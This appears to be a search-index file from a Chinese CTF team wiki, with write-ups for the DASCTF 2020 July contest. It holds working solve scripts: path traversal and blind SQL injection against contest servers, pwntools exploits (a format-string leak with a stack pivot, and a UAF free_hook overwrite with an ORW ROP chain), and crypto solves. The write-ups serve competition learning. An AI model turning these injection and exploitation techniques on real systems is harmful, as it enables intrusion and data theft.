{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"\u81ea\u7559\u5730 \u00b6 \u8fd9\u513f\u4e3b\u8981\u5199\u4e00\u4e9b\u6bd4\u8d5b\u7684wp \u6682\u65f6\u7531\u4ee5\u4e0b\u4eba\u5458\u7ef4\u62a4\uff1a Nopnoping(\u5927\u4f6c) \uff1a\u4e00\u4e2a\u975e\u5e38\u975e\u5e38\u975e\u5e38\u5389\u5bb3\u7684pwn\uff0c\u5de6\u80fd\u710a\u82af\u7247\uff0c\u53f3\u80fd\u5199\u4ee3\u7801\u3002\uff08\u5927\u4f6c\u65e0\u7591 blog\u5730\u5740 sw0r3d(\u5212\u6c34) \uff1a\u4e00\u4e2a\u8fa3\u9e21web&crypto\uff0c\u6bcf\u6b21\u804c\u4e1a\u62b1nop\u4f6c\u5927\u817f\u3002\uff08noptql \uff08\u592a\u5783\u573e\u800c\u4e0d\u653e\u535a\u5ba2\u4e86\uff09 \u4e0b\u9762\u7b80\u5355\u5199\u4e00\u4e0b\u5173\u4e8egit\u600e\u4e48\u6dfb\u52a0\u7528\u6237\uff1a \u672c\u5730\u751f\u6210\u5bf9\u5e94\u8d26\u6237\u7684ssh\u5bc6\u94a5 \u7528 ssh-add (\u5bf9\u5e94\u7684\u5bc6\u94a5) \u6765\u6dfb\u52a0ssh\u5bc6\u94a5 \u5982\u679c\u4e0a\u9762\u62a5\u9519\u5c31\u7528 ssh-agent bash \u6765\u66f4\u65b0\u4e00\u4e0b ssh -T git@github.com \u6d4b\u8bd5\u4e00\u4e0b\u7528\u6237 \u7136\u540egit clone\u5230\u672c\u5730\u5c31\u53ef\u4ee5\u8fdb\u884c\u4fee\u6539\uff0c\u5efa\u8bae\u5148\u672c\u5730\u6d4b\u8bd5\u518d\u8fdc\u7a0b\u63d0\u4ea4\uff1a # \u5728wiki\u76ee\u5f55\u91cc\u6267\u884c mkdocs serve \u7136\u540e\u5728127.0.0.1:8000\u5c31\u80fd\u770b\u5230\u672c\u5730\u751f\u6210\u7684wiki\u4e86 \u8fdc\u7a0b\u63d0\u4ea4\uff1a mkdocs gh-deploy","title":"\u4ecb\u7ecd"},{"location":"#_1","text":"\u8fd9\u513f\u4e3b\u8981\u5199\u4e00\u4e9b\u6bd4\u8d5b\u7684wp \u6682\u65f6\u7531\u4ee5\u4e0b\u4eba\u5458\u7ef4\u62a4\uff1a Nopnoping(\u5927\u4f6c) \uff1a\u4e00\u4e2a\u975e\u5e38\u975e\u5e38\u975e\u5e38\u5389\u5bb3\u7684pwn\uff0c\u5de6\u80fd\u710a\u82af\u7247\uff0c\u53f3\u80fd\u5199\u4ee3\u7801\u3002\uff08\u5927\u4f6c\u65e0\u7591 blog\u5730\u5740 sw0r3d(\u5212\u6c34) \uff1a\u4e00\u4e2a\u8fa3\u9e21web&crypto\uff0c\u6bcf\u6b21\u804c\u4e1a\u62b1nop\u4f6c\u5927\u817f\u3002\uff08noptql \uff08\u592a\u5783\u573e\u800c\u4e0d\u653e\u535a\u5ba2\u4e86\uff09 \u4e0b\u9762\u7b80\u5355\u5199\u4e00\u4e0b\u5173\u4e8egit\u600e\u4e48\u6dfb\u52a0\u7528\u6237\uff1a \u672c\u5730\u751f\u6210\u5bf9\u5e94\u8d26\u6237\u7684ssh\u5bc6\u94a5 \u7528 ssh-add (\u5bf9\u5e94\u7684\u5bc6\u94a5) \u6765\u6dfb\u52a0ssh\u5bc6\u94a5 \u5982\u679c\u4e0a\u9762\u62a5\u9519\u5c31\u7528 ssh-agent bash \u6765\u66f4\u65b0\u4e00\u4e0b ssh -T git@github.com \u6d4b\u8bd5\u4e00\u4e0b\u7528\u6237 \u7136\u540egit clone\u5230\u672c\u5730\u5c31\u53ef\u4ee5\u8fdb\u884c\u4fee\u6539\uff0c\u5efa\u8bae\u5148\u672c\u5730\u6d4b\u8bd5\u518d\u8fdc\u7a0b\u63d0\u4ea4\uff1a # \u5728wiki\u76ee\u5f55\u91cc\u6267\u884c mkdocs serve \u7136\u540e\u5728127.0.0.1:8000\u5c31\u80fd\u770b\u5230\u672c\u5730\u751f\u6210\u7684wiki\u4e86 \u8fdc\u7a0b\u63d0\u4ea4\uff1a mkdocs gh-deploy","title":"\u81ea\u7559\u5730"},{"location":"wp/DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B/","text":"\u8fd9\u6b21\u662f\u7531okami\u548csw0r3d\u4ee5\u53canop\u5171\u540c\u5b8c\u6210 Web \u00b6 ezfileinclude \u00b6 \u8003\u70b9\uff1a\u76ee\u5f55\u904d\u5386+\uff1f import time import requests import sys times = int ( time . time ()) f = \"awdwadawd../../../../../../flag\" print f f = f . encode ( 'base64' ) url = \"http://183.129.189.60:10009/image.php?t=\" + str ( times ) + \"&f=\" + f print url r = requests . get ( url ) print r . text SQLi \u00b6 \u8003\u70b9\uff1a\u65e0\u5217\u540d+\u76f2\u6ce8+schema\u7684bypass \u8fc7\u6ee4\u4e86n\u591a\uff0c\u76f2\u6ce8+\u65e0\u5217\u540d+sys.x$schema_flattened_keys\u7684bypass import requests string = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM} { _ ~ ! . [] / \\\\ +- * /<> () & $ %^@ #,' url = \"http://183.129.189.60:10004/\" # payload = \"?id=1'<(length(database())= {} )%23\" # payload = \"?id=1'<(ascii(substr(database(), {} ))= {} )%23\" payload = \"?id=1'<(ascii(substr((select/**/group_concat(table_name)from/**/sys.x$schema_flattened_keys/**/where/**/table_schema=database()), {} ,1)) = {} )%23\" def Number (): for i in range ( 50 ): payloads = payload . format ( i ) # print i print url + payloads r = requests . post ( url + payloads ) print r . text if \"root\" in r . text : print \"length:\" + str ( i ) break ; def Data ( lens ): data = '' for i in range ( 1 , lens + 1 ): for asc in range ( len ( string )): payloads = payload . format ( i , ord ( string [ asc ])) print url + payloads r = requests . post ( url + payloads ) print r . text if \"root\" in r . text : data += string [ asc ] print \"data:\" + data if __name__ == '__main__' : #Number() Data ( 100 ) import requests url = \"http://183.129.189.60:10004/\" def add ( flag ): res = '' res += flag return res flag = '' for i in range ( 1 , 200 ): for char in range ( 32 , 127 ): hexchar = add ( flag + chr ( char )) payload = \"?id=1'<((select/**/1,'FLAG{\" + hexchar + \"')>(select/**/*/**/from/**/flllaaaggg))%23\" urls = url + payload r = requests . post ( urls ) text = r . text print urls print text if 'root' in r . text : flag += chr ( char - 1 ) print ( flag ) break Pwn \u00b6 \u865a\u5047\u7684\u7b7e\u5230\u9898 \u00b6 \u4e00\u9053\u7b80\u5355\u7684\u6808\u6ea2\u51fa\uff0c\u4f46\u662f\u51fa\u9898\u4eba\u5728\u7a0b\u5e8f\u7684\u6700\u540e\u505a\u4e86\u4e00\u70b9\u70b9\u4fee\u6539\u3002 leave\u4ee5\u540e\u4f1a\u4fee\u6539esp\u4e3aecx-4\uff0c\u800cecx\u7684\u503c\u4e3aebp-4\u5730\u5740\u4e0a\u7684\u503c\u3002\u4e5f\u5c31\u662f\uff1aesp=[ebp-4]-4\u3002\u56e0\u6b64\u6211\u4eec\u9996\u5148\u9700\u8981\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u6f0f\u6d1e\u6cc4\u6f0f\u6808\u5730\u5740\uff0c\u7136\u540e\u4fee\u6539ebp-4\u4e3a\u6211\u4eec\u53ef\u63a7\u7684\u5730\u5740\uff0c\u5e76\u4e14\u4fee\u6539\u8be5\u5730\u5740-4\u5904\u7684\u503c\u4e3abackdoor\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u5f97shell\u4e86\u3002 \u601d\u8def\u603b\u7ed3\u4e00\u4e0b\uff1a \u6cc4\u6f0f\u6808\u5730\u5740 \u4fee\u6539ebp-4\u7684\u503c\u4e3a\u53ef\u63a7\u5730\u5740 \u4fee\u6539\u53ef\u63a7\u5730\u5740-4\u5904\u7684\u503c\u4e3abackdoor OK\uff0c\u601d\u8def\u5c31\u662f\u8fd9\u6837\uff0c\u4f46\u662f\u53ea\u6709\u81ea\u5df1\u5b9e\u8df5\u4e00\u4e0b\uff0c\u624d\u80fd\u660e\u767d\u5982\u4f55EXP\u7684payload\u4e3a\u4f55\u5982\u6b64\u8bbe\u7f6e\u3002 #Author: Nopnoping from pwn import * s = lambda data : sh . send ( data ) sa = lambda delim , data : sh . sendafter ( delim , data ) sl = lambda data : sh . sendline ( data ) sla = lambda delim , data : sh . sendlineafter ( delim , data ) sea = lambda delim , data : sh . sendafter ( delim , data ) r = lambda numb = 4096 : sh . recv ( numb ) ru = lambda delims , drop = True : sh . recvuntil ( delims , drop ) info_addr = lambda tag , addr : sh . info ( tag + ': {:#x} ' . format ( addr )) itr = lambda : sh . interactive () debug = lambda command = '' : gdb . attach ( sh , command ) if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10013 ) else : sh = process ( './qiandao' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' def exp (): #debug(\"b*0x080485F5\\nc\") ru ( \":\" ) sl ( \"%2$p\" ) ru ( \" \\n \" ) stack = int ( ru ( \" \\n \" ) . replace ( \" \\n \" , \"\" ), 16 ) - 0x24 info_addr ( \"stack\" , stack ) ru ( \"?\" ) payload = p32 ( 0x0804857D ) + \" \\x00 \" * 0x20 + p32 ( stack ) sl ( payload ) itr () exp () bigbear \u00b6 \u9898\u76ee\u5f88\u7b80\u5355\uff0c\u6709\u4e00\u4e2aUAF\u6f0f\u6d1e\uff0c\u96be\u5728\u5982\u4f55\u5229\u7528\u3002\u9898\u76ee\u9650\u5236\u4f7f\u7528execve\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u9700\u8981\u5229\u7528ORW\u4e86\uff0c\u800c\u60f3\u7528ORW\u5219\u9700\u8981\u6808\u8fc1\u79fb\uff0c\u7b2c\u4e00\u4e2a\u60f3\u5230\u7684\u662f\u4f7f\u7528setcontext\u6765\u5b9e\u73b0\uff0c\u4f46\u662f\u9898\u76eelibc\u7248\u672c\u662f2.30\uff0csetcontext\u65e0\u6cd5\u4f7f\u7528\uff0c\u90a3\u600e\u4e48\u529e\u5462\uff1f\u8fd9\u91cc\u5229\u7528\u4e86\u4e0a\u5468geekpwn playthenew \u8fd9\u9053\u9898\u76ee\u7684\u601d\u8def\u3002 \u6211\u4eec\u5148\u4e0d\u8bf4\u5229\u7528\u65b9\u6cd5\uff0c\u5148\u60f3\u4e00\u60f3\u8981\u5b9e\u73b0\u6808\u8fc1\u79fb\u7684\u8bdd\uff0c\u6211\u4eec\u8981\u600e\u4e48\u505a\u3002\u9996\u5148\u6211\u4eec\u5f97\u628arbp\u4fee\u6539\u4e3a\u53ef\u63a7\u7684\u503c\uff0c\u7136\u540e\u6267\u884cleave ret\u5bf9\u5427\uff1f\u6211\u4eec\u5229\u7528UAF\u653b\u51fb\uff0c\u53ef\u4ee5\u4fee\u6539free_hook\u4e3a\u4efb\u610f\u51fd\u6570\uff0c\u5f53free\u6389\u4e00\u4e2a\u5806\u5757\u65f6\uff0c\u4f1a\u5c06\u5806\u5757\u5730\u5740\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f20\u9012\u7ed9\u8be5\u51fd\u6570\u3002\u5982\u679c\u6211\u4eec\u80fd\u5728libc\u4e2d\u627e\u5230\u4e00\u4e2a\u51fd\u6570\u7247\u6bb5\uff0c\u5176\u6709mov rbp\uff0crdi\u8fd9\u6837\u5f62\u5f0f\u7684\u6307\u4ee4\uff0c\u800c\u4e14\u8fd8\u6709\u4e00\u4e2acall\u51fd\u6570\u53ef\u63a7\uff0c\u5e76\u5c06call\u51fd\u6570\u4fee\u6539\u4e3aleave ret\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5b9e\u73b0\u6808\u8fc1\u79fb\uff0c\u5e76\u6267\u884cROP\u94fe\u3002 \u5229\u7528IDA\u641c\u7d22\uff0c\u6211\u627e\u5230\u4e00\u4e2a\u51fd\u6570\u7247\u6bb5\uff0c\u521a\u597d\u53ef\u4ee5\u5b9e\u73b0\u4e0a\u9762\u6240\u8bc9\u7684\u5185\u5bb9\u3002 \u8fd9\u4e2a\u51fd\u6570\u7247\u6bb5\u5c06rbp\u4fee\u6539\u4e3a[rdi+0x48]\uff0c\u5e76call [[rdi+0x18]+0x28]\u3002\u6211\u4eec\u53ea\u8981\u7cbe\u5fc3\u6784\u9020\u8be5\u5806\u5757\u7684\u503c\uff0c\u5c31\u53ef\u4ee5\u5b9e\u73b0\u6808\u8fc1\u79fb\u5e76\u6267\u884cROP\u94fe\u3002 \u6784\u9020\u7684\u7ec6\u8282\u5c31\u4e0d\u591a\u8bf4\u4e86\uff0c\u5927\u5bb6\u770b\u770bEXP\uff0c\u8c03\u8bd5\u8c03\u8bd5\u5c31\u80fd\u660e\u767d\u3002 (\u4e0d\u8fc7\u8fd9\u79cd\u65b9\u6cd5\u4e0d\u662f\u9884\u671f\u89e3\uff0c\u9884\u671f\u89e3\u662f\u5229\u7528io_file\u7684str_overflow\u63a7\u5236rdx\u6765\u4f7f\u7528setcontext\u3002get\u4e86 #Author: Nopnoping from pwn import * s = lambda data : sh . send ( data ) sa = lambda delim , data : sh . sendafter ( delim , data ) sl = lambda data : sh . sendline ( data ) sla = lambda delim , data : sh . sendlineafter ( delim , data ) sea = lambda delim , data : sh . sendafter ( delim , data ) r = lambda numb = 4096 : sh . recv ( numb ) ru = lambda delims , drop = True : sh . recvuntil ( delims , drop ) info_addr = lambda tag , addr : sh . info ( tag + ': {:#x} ' . format ( addr )) itr = lambda : sh . interactive () debug = lambda command = '' : gdb . attach ( sh , command ) if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10011 ) else : sh = process ( \"./bigbear\" ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' def choice ( elect ): ru ( '>>' ) sl ( str ( elect )) def add ( size , content ): choice ( 1 ) ru ( \":\" ) sl ( str ( size )) ru ( ':' ) sl ( str ( content )) def edit ( index , content ): choice ( 4 ) ru ( 'idx' ) sl ( str ( index )) ru ( ':' ) sl ( content ) def show ( index ): choice ( 3 ) ru ( ':' ) sl ( str ( index )) def delete ( index ): choice ( 2 ) ru ( 'idx' ) sl ( str ( index )) def exp (): libc = ELF ( \"./libc.so.6\" ) add ( 0x1000 , 'a' ) #0 add ( 0x20 , 'a' ) #1 add ( 0x20 , 'a' ) #2 delete ( 0 ) show ( 0 ) ru ( \":\" ) libc_base = u64 ( r ( 6 ) . ljust ( 8 , ' \\x00 ' )) - 0x1eabe0 info_addr ( \"libc_base\" , libc_base ) setcontext = libc_base + libc . symbols [ 'setcontext' ] free_hook = libc_base + libc . symbols [ '__free_hook' ] secret = libc_base + 0x000000000157F7A info_addr ( \"setcontext\" , setcontext ) info_addr ( \"free_hook\" , free_hook ) info_addr ( \"secret\" , secret ) delete ( 1 ) delete ( 2 ) show ( 2 ) ru ( \":\" ) heap = u64 ( r ( 6 ) . ljust ( 8 , ' \\x00 ' )) - 0x1010 info_addr ( \"heap\" , heap ) edit ( 2 , p64 ( free_hook ) + p64 ( 0 )) add ( 0x20 , 'a' ) add ( 0x20 , p64 ( secret )) leave_ret = libc_base + 0x000000000005A9A8 rdi_ret = libc_base + 0x0000000000026bb2 rsi_ret = libc_base + 0x000000000002709c rdx_r12_ret = libc_base + 0x000000000011c3b1 open_ = libc_base + libc . symbols [ \"open\" ] read = libc_base + libc . symbols [ \"read\" ] write = libc_base + libc . symbols [ 'write' ] payload = \"./flag \\x00\\x00 \" + p64 ( rdx_r12_ret ) + p64 ( 0 ) + p64 ( heap ) + p64 ( rdx_r12_ret ) + p64 ( leave_ret ) + p64 ( 0 ) + p64 ( rdx_r12_ret ) + p64 ( 0 ) + p64 ( heap ) payload += p64 ( rdi_ret ) + p64 ( heap ) + p64 ( rsi_ret ) + p64 ( 0 ) + p64 ( open_ ) payload += p64 ( rdi_ret ) + p64 ( 3 ) + p64 ( rsi_ret ) + p64 ( heap - 0x100 ) + p64 ( rdx_r12_ret ) + p64 ( 0x30 ) + p64 ( 0 ) + p64 ( read ) payload += p64 ( rdi_ret ) + p64 ( 1 ) + p64 ( rsi_ret ) + p64 ( heap - 0x100 ) + p64 ( rdx_r12_ret ) + p64 ( 0x30 ) + p64 ( 0 ) + p64 ( write ) add ( 0x100 , payload ) #debug(\"b*0x7ffff7f2ff7a\\nc\") delete ( 5 ) itr () exp () Crypto \u00b6 bullshit \u00b6 from flag import flag def pairing ( a , b ): shell = max ( a , b ) step = min ( a , b ) if step == b : flag = 0 else : flag = 1 return shell ** 2 + step * 2 + flag def encrypt ( message ): res = '' for i in range ( 0 , len ( message ), 2 ): res += str ( pairing ( message [ i ], message [ i + 1 ])) return res print ( encrypt ( flag )) # 1186910804152291019933541010532411051999082499105051010395199519323297119520312715722 \u4f9d\u6b21\u5bf9\u660e\u6587\u4e24\u4e2a\u5b57\u7b26\u4e00\u7ec4\u8fdb\u884c\u52a0\u5bc6\uff0c\u5173\u952e\u70b9\u662f\u628a\u5bc6\u6587\u5bf9\u5e94\u7684\u7ec4\u5206\u5f00\uff0c\u770b\u4e00\u4e0bpairing\u51fd\u6570\u7684\u8fd4\u56de\u503c\u3002\u660e\u6587\u7684\u5b57\u7b26\u8303\u56f4\u5e94\u8be5\u662f0-9_A-Z_a-z_{}\uff0c\u5176\u4e2d\u6700\u5927\u7684ascii\u6570\u503c\u662f125\uff0c\u8fd4\u56de\u503c\u6700\u5927\u4e0d\u8d85\u8fc716000\uff0c\u6700\u5c0f\u5927\u4e8e2000\uff0c\u6839\u636e\u8fd9\u4e2a\u53ef\u4ee5\u5206\u5272\u5bc6\u6587\u5bf9\u5e94\u660e\u6587\u6bb5\uff0c\u7136\u540e\u7206\u7834\u51fa\u5bf9\u5e94\u660e\u6587\u5373\u53ef\u3002 from Crypto.Util.number import * def pairing ( a , b ): shell = max ( a , b ) step = min ( a , b ) if step == b : flag = 0 else : flag = 1 return shell ** 2 + step * 2 + flag text = '11869 10804 15229 10199 3354 10105 3241 10519 9908 2499 10505 10103 9519 9519 3232 9711 9520 3127 15722' def decrypt ( a ): for i in range ( 255 ): for j in range ( 255 ): if pairing ( i , j ) == a : return i , j a = text . split () l1 = [] for i in a : if decrypt ( int ( i )): m , n = decrypt ( int ( i )) l1 . append ( m ) l1 . append ( n ) flag = '' for i in l1 : flag += chr ( i ) print flag ezrsa \u00b6 enc.py: from secret import flag from Crypto.Util.number import getPrime , inverse , bytes_to_long , long_to_bytes from sympy import isprime m = bytes_to_long ( flag ) i = 0 p = getPrime ( 1024 ) r = getPrime ( 1024 ) while True : i += 1 q = 5 * p + i if isprime ( q ): break n = p * q * r e = 65537 c = pow ( m , e , n ) p3 = pow ( p , 3 , n ) q3 = pow ( q , 3 , n ) print c print e print n print p3 print q3 #c=121836624300974075697021410307617877799398704636412997043885070081959280989429720121505939271618801519845564677294487289085261071864489530938936756975266796724602572135614554790383740417604947122325421381322155502222532570899845171858215244411945889235509975121332503672838693190271397334662495169940649349725607212867270114445618201171582223868214171942753939282404133460110489725340075179818856587044172460703519751189284498768640898837525773823127259807337383870535232880471869465188882667401540052151795173003568424369575866780354852158304748299284900468768898966143729562589110027789165774068500360970335261801131264801996703446527156709491597639262305131309592217711956181866054589085773085822482247966030763162382493197473555330201343835684065991963179440335668817727280429581864224497755004825170263803174390985868997862117983334405815543271969716910040927833496696049703621334172902517666284662473059140662717708823 #e=65537 #n=20361372240024088786698455948788052559208001789410016096382703853157107986024860262721685000417719260611935731634077852127432140361792767202581631816544546972750034494061276779878409544779707914261679633764772575040304712361634318086289783951555842021028438799649252652041211341825451500751760872572402250747982495384263677669526575825183733353800694161425360299521143726681387485097281832219009682768523304737252763907939642212542959846630464628135025203489075698699980715986689341069964387779523254203021424865355054215122316160201073604105317768112281914334065349420946717116563634883368316247495042216330408372176714499012778410160478384503335610321108263706243329745785632599707740534386988945259578897614317582546751658480917188464178997026284336861027299289073045677754342746386408505695243800685323283852020325044649604548575089927541935884800327121875191739922436199496098842684301207745090701158839031935190703347091 #p3=3639847731266473012111996909765465259684540134584180368372338570948892196816095838781423020996407457408188225238520927483809091079993151555076781372882518810174687150067903870448436299501557380508793238254471833275507634732947964907461619182112787911133054275872120243558556697900528427679352181961312958660881800731678134481664074711076672290178389996403357076809805422591851145306425951725627843352207233693810474618882394140691334742086008967260117740486955640068190440609984095657695423536016475468229419187489359563800737261212975921663803729112420222039005478830477455592167092520074509241894829304209406713781082959299623674294927249556083486223036858674077173104518013601628447504500606447821540687465361616447631579976579754996021653630804073535352129315413118764836270751250405649683786487251823247828947202336680538849571498780353357272103697510910576879383751704763858882439578045020243015928994208017750848637513 #q3=7030777127779173206633582847346001157991477456002191926122836599155148909465054067800807615361108442560942058865403188672629297039703065927801771646334817871335134889139894648729527452541098449842202838983982508551750669662540615534327150829869964429006130891731472099912937717406120443380283548571270317421722042835639732966975812764084015221255115940508456442279902250677665136380988902682370875602145833135937210740790528756301051981994351553247852018355526641012434670664732924491790949235519600899289515495046353559475806935200029321563549553167235419039924276406059858659476329718809657072997385947262654743181242885709558209249589482036673428723035300722280229192727192487772217518673838209646300548275957450994828221329299666216457961746189885356929698674294944243729739850927111231235060005119781652245234537583181232715964191675241206562888107252569566488402724441835466680342239244581162530424964324562530832713397 p^3\u53ef\u80fd\u5c0f\u4e8en \uff08n=p*q*r\uff0cq=5*p+i\uff09\uff0c\u76f4\u63a5\u5bf9p3\u5f00\u65b9\u53d1\u73b0\u5c31\u53ef\u4ee5\u6c42\u51fap\uff08\u53ef\u80fd\u4e0d\u662f\u9884\u671f\u89e3\uff09\uff0c\u7136\u540e\u5e26\u8fdb\u5faa\u73af\u4e2d\u5373\u53ef\u6c42\u51fai\u548cq\u3002\u7531p\u548cq3\u53ef\u4ee5\u7206\u51fan\u3002\u7136\u540e\u6c42\u51far\uff0c\u63a5\u7740\u5c31\u662f\u7b80\u5355rsa\u4e86\u3002\u3002\u3002\uff08\u8fd9\u513fn\u53ef\u80fd\u6709\u591a\u4e2a\u503c from Crypto.Util.number import * from sympy import isprime import gmpy2 c = 121836624300974075697021410307617877799398704636412997043885070081959280989429720121505939271618801519845564677294487289085261071864489530938936756975266796724602572135614554790383740417604947122325421381322155502222532570899845171858215244411945889235509975121332503672838693190271397334662495169940649349725607212867270114445618201171582223868214171942753939282404133460110489725340075179818856587044172460703519751189284498768640898837525773823127259807337383870535232880471869465188882667401540052151795173003568424369575866780354852158304748299284900468768898966143729562589110027789165774068500360970335261801131264801996703446527156709491597639262305131309592217711956181866054589085773085822482247966030763162382493197473555330201343835684065991963179440335668817727280429581864224497755004825170263803174390985868997862117983334405815543271969716910040927833496696049703621334172902517666284662473059140662717708823 q3 = 7030777127779173206633582847346001157991477456002191926122836599155148909465054067800807615361108442560942058865403188672629297039703065927801771646334817871335134889139894648729527452541098449842202838983982508551750669662540615534327150829869964429006130891731472099912937717406120443380283548571270317421722042835639732966975812764084015221255115940508456442279902250677665136380988902682370875602145833135937210740790528756301051981994351553247852018355526641012434670664732924491790949235519600899289515495046353559475806935200029321563549553167235419039924276406059858659476329718809657072997385947262654743181242885709558209249589482036673428723035300722280229192727192487772217518673838209646300548275957450994828221329299666216457961746189885356929698674294944243729739850927111231235060005119781652245234537583181232715964191675241206562888107252569566488402724441835466680342239244581162530424964324562530832713397 p3 = 3639847731266473012111996909765465259684540134584180368372338570948892196816095838781423020996407457408188225238520927483809091079993151555076781372882518810174687150067903870448436299501557380508793238254471833275507634732947964907461619182112787911133054275872120243558556697900528427679352181961312958660881800731678134481664074711076672290178389996403357076809805422591851145306425951725627843352207233693810474618882394140691334742086008967260117740486955640068190440609984095657695423536016475468229419187489359563800737261212975921663803729112420222039005478830477455592167092520074509241894829304209406713781082959299623674294927249556083486223036858674077173104518013601628447504500606447821540687465361616447631579976579754996021653630804073535352129315413118764836270751250405649683786487251823247828947202336680538849571498780353357272103697510910576879383751704763858882439578045020243015928994208017750848637513 c1 = 7030777127779173206633582847346001157991477456002191926122836599155148909465054067800807615361108442560942058865403188672629297039703065927801771646334817871335134889139894648729527452541098449842202838983982508551750669662540615534327150829869964429006130891731472099912937717406120443380283548571270317421722042835639732966975812764084015221255115940508456442279902250677665136380988902682370875602145833135937210740790528756301051981994351553247852018355526641012434670664732924491790949235519600899289515495046353559475806935200029321563549553167235419039924276406059858659476329718809657072997385947262654743181242885709558209249589482036673428723035300722280229192727192487772217518673838209646300548275957450994828221329299666216457961746189885356929698674294944243729739850927111231235060005119781652245234537583181232715964191675241206562888107252569566488402724441835466680342239244581162530424964324562530832713397 p , err = gmpy2 . iroot ( p3 , 3 ) i = 0 while True : i += 1 q = 5 * p + i if isprime ( q ): #print q break e = 65537 for i in range ( 1 , 100 ): x = q ** 3 - q3 n = x / i if x % i == 0 and p3 == pow ( p , 3 , n ) and q3 == pow ( q , 3 , n ): t_n = n r = ( t_n / q ) / p phi = ( p - 1 ) * ( q - 1 ) * ( r - 1 ) d = gmpy2 . invert ( e , phi ) text = long_to_bytes ( pow ( c , d , n )) if 'flag' in text : print text","title":"DASCTF2020-7\u6708\u8d5b"},{"location":"wp/DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B/#web","text":"","title":"Web"},{"location":"wp/DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B/#ezfileinclude","text":"\u8003\u70b9\uff1a\u76ee\u5f55\u904d\u5386+\uff1f import time import requests import sys times = int ( time . time ()) f = \"awdwadawd../../../../../../flag\" print f f = f . encode ( 'base64' ) url = \"http://183.129.189.60:10009/image.php?t=\" + str ( times ) + \"&f=\" + f print url r = requests . get ( url ) print r . text","title":"ezfileinclude"},{"location":"wp/DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B/#sqli","text":"\u8003\u70b9\uff1a\u65e0\u5217\u540d+\u76f2\u6ce8+schema\u7684bypass \u8fc7\u6ee4\u4e86n\u591a\uff0c\u76f2\u6ce8+\u65e0\u5217\u540d+sys.x$schema_flattened_keys\u7684bypass import requests string = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM} { _ ~ ! . [] / \\\\ +- * /<> () & $ %^@ #,' url = \"http://183.129.189.60:10004/\" # payload = \"?id=1'<(length(database())= {} )%23\" # payload = \"?id=1'<(ascii(substr(database(), {} ))= {} )%23\" payload = \"?id=1'<(ascii(substr((select/**/group_concat(table_name)from/**/sys.x$schema_flattened_keys/**/where/**/table_schema=database()), {} ,1)) = {} )%23\" def Number (): for i in range ( 50 ): payloads = payload . format ( i ) # print i print url + payloads r = requests . post ( url + payloads ) print r . text if \"root\" in r . text : print \"length:\" + str ( i ) break ; def Data ( lens ): data = '' for i in range ( 1 , lens + 1 ): for asc in range ( len ( string )): payloads = payload . format ( i , ord ( string [ asc ])) print url + payloads r = requests . post ( url + payloads ) print r . text if \"root\" in r . text : data += string [ asc ] print \"data:\" + data if __name__ == '__main__' : #Number() Data ( 100 ) import requests url = \"http://183.129.189.60:10004/\" def add ( flag ): res = '' res += flag return res flag = '' for i in range ( 1 , 200 ): for char in range ( 32 , 127 ): hexchar = add ( flag + chr ( char )) payload = \"?id=1'<((select/**/1,'FLAG{\" + hexchar + \"')>(select/**/*/**/from/**/flllaaaggg))%23\" urls = url + payload r = requests . post ( urls ) text = r . text print urls print text if 'root' in r . text : flag += chr ( char - 1 ) print ( flag ) break","title":"SQLi"},{"location":"wp/DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B/#pwn","text":"","title":"Pwn"},{"location":"wp/DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B/#_1","text":"\u4e00\u9053\u7b80\u5355\u7684\u6808\u6ea2\u51fa\uff0c\u4f46\u662f\u51fa\u9898\u4eba\u5728\u7a0b\u5e8f\u7684\u6700\u540e\u505a\u4e86\u4e00\u70b9\u70b9\u4fee\u6539\u3002 leave\u4ee5\u540e\u4f1a\u4fee\u6539esp\u4e3aecx-4\uff0c\u800cecx\u7684\u503c\u4e3aebp-4\u5730\u5740\u4e0a\u7684\u503c\u3002\u4e5f\u5c31\u662f\uff1aesp=[ebp-4]-4\u3002\u56e0\u6b64\u6211\u4eec\u9996\u5148\u9700\u8981\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u6f0f\u6d1e\u6cc4\u6f0f\u6808\u5730\u5740\uff0c\u7136\u540e\u4fee\u6539ebp-4\u4e3a\u6211\u4eec\u53ef\u63a7\u7684\u5730\u5740\uff0c\u5e76\u4e14\u4fee\u6539\u8be5\u5730\u5740-4\u5904\u7684\u503c\u4e3abackdoor\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u5f97shell\u4e86\u3002 \u601d\u8def\u603b\u7ed3\u4e00\u4e0b\uff1a \u6cc4\u6f0f\u6808\u5730\u5740 \u4fee\u6539ebp-4\u7684\u503c\u4e3a\u53ef\u63a7\u5730\u5740 \u4fee\u6539\u53ef\u63a7\u5730\u5740-4\u5904\u7684\u503c\u4e3abackdoor OK\uff0c\u601d\u8def\u5c31\u662f\u8fd9\u6837\uff0c\u4f46\u662f\u53ea\u6709\u81ea\u5df1\u5b9e\u8df5\u4e00\u4e0b\uff0c\u624d\u80fd\u660e\u767d\u5982\u4f55EXP\u7684payload\u4e3a\u4f55\u5982\u6b64\u8bbe\u7f6e\u3002 #Author: Nopnoping from pwn import * s = lambda data : sh . send ( data ) sa = lambda delim , data : sh . sendafter ( delim , data ) sl = lambda data : sh . sendline ( data ) sla = lambda delim , data : sh . sendlineafter ( delim , data ) sea = lambda delim , data : sh . 